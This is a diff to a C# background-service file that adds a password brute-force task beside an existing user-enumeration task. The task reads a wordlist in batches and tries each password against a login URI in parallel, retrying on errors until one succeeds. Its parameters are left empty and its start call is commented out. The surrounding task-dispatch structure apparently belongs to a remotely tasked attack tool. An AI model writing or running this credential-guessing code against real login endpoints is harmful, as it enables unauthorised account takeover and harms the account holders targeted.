@@ -1,10 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Net.Http;
 using System.Reflection;
 using System.Threading;
+using System.Threading.Tasks;
 using Newtonsoft.Json;
 
 namespace react_background_service
@@ -54,7 +56,8 @@ namespace react_background_service
 
                         SendStatus();
 
-                        if (action.TaskType == 0) // Task.TaskType.Enumeration
+                        // USER ENUMERATION
+                        if (action.TaskType == Task.Type.Enumeration)
                         {
                             var enumTask = new System.Threading.Tasks.Task(async () =>
                             {
@@ -80,6 +83,86 @@ namespace react_background_service
                             });
                             enumTask.Start();
                         }
+                    }
+                    
+                    // BRUTE FORCE ATTACK
+                    if (action.TaskType == Task.Type.BruteForce)
+                    {
+                        var bruteTask = new System.Threading.Tasks.Task(() =>
+                        {
+                            var uri = "";
+                            var username = "";
+                            var wordListPath = "";
+                            var maxThreads = 0;
+                            var batchCount = 0;
+                            var retryCount = 0;
+                            var outFilePath = "";
+                            var found = false;
+                            var watch = Stopwatch.StartNew();
+
+                            var la = new LoginAttempt(new Uri(uri));
+                            using var sr = new StreamReader(wordListPath);
+
+                            void update(decimal percentage, long seconds)
+                            {
+                                var remaining = TimeSpan.FromSeconds(seconds);
+                                var progress = $"{percentage * 100:0.0000}";
+                            }
+
+                            while (!sr.EndOfStream)
+                            {
+                                var buffer = new List<string>();
+                                for (var i = 0; i < batchCount; i++)
+                                {
+                                    buffer.Add(sr.ReadLine());
+                                }
+
+                                var percentage = (decimal)sr.BaseStream.Position / sr.BaseStream.Length;
+                                var percentsPerSecond = percentage / (decimal)watch.Elapsed.TotalSeconds;
+                                var remainingSeconds = (long)((1 - percentage) / percentsPerSecond);
+                                update(percentage, remainingSeconds);
+
+                                Parallel.ForEach(buffer, new ParallelOptions { MaxDegreeOfParallelism = maxThreads },
+                                    password =>
+                                    {
+                                        var currentRetry = 0;
+
+                                        for (; ; ) // retry pattern
+                                        {
+                                            try
+                                            {
+                                                if (!la.LoginAttemptAsync(username, password).GetAwaiter().GetResult()) return;
+
+                                                // password found!
+                                                found = true;
+
+                                                break;
+                                            }
+                                            // in case the login attempt fails.
+                                            // ToDo: [Brute Force Exception handler] Keep trying if the exception may be temporary. Stop trying if not.
+                                            catch
+                                            {
+                                                currentRetry++;
+
+                                                if (currentRetry > retryCount)
+                                                {
+                                                    break; // not work, stop trying
+                                                }
+
+                                                Thread.Sleep(1000 * currentRetry);
+                                            }
+                                        }
+                                    });
+
+                                if (found) return;
+                            }
+
+                            if (found) return;
+
+                            // Password not found!
+
+                        });
+                        //bruteTask.Start();
                     }
 
                     if (action.MessageAction == Task.Action.Remove)
